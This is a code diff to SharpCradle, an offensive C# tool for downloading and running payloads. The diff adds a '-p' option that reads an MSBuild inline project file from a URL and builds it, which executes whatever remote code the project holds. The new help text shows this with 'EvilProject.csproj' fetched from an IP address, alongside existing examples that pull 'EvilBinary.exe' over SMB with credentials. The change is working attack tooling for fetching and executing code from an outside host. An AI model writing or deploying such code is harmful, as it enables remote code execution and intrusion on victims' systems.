@@ -65,6 +65,15 @@ namespace SharpCradle
                    loadAssembly(bin, cmd);
                 }
             }//End if -w
+            else if (args[0] == "-p")
+            {
+                //Access web to capture, build, and execute inline CS project file
+                var proj = System.Xml.XmlReader.Create(args[1]);
+                var msbuild = new Microsoft.Build.Evaluation.Project(proj);
+                msbuild.Build();
+                proj.Close();
+             }//End if -p
+
           }//End try
           catch
           {
@@ -90,6 +99,7 @@ namespace SharpCradle
                 }
             }//End try/catch            
         }//End loadAssembly
+
         private static void help()
         {
             Console.WriteLine();
@@ -120,6 +130,12 @@ namespace SharpCradle
             Console.WriteLine(@"c:\> SharpCradle.exe -f -c domain username password \\192.168.1.10\MyShare\EvilBinary.exe");
             Console.WriteLine();
             Console.WriteLine(@"c:\> SharpCradle.exe -f -c domain username password \\ComputerName\MyShare\EvilBinary.exe <arguments to pass to EvilBinary.exe>");
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine("Download .NET inline project file from web");
+            Console.WriteLine("-----------------------------------------------------");
+            Console.WriteLine();
+            Console.WriteLine(@"c:\> SharpCradle.exe -p https://192.168.1.10/EvilProject.csproj");
             Console.WriteLine();
             Console.WriteLine();
         }
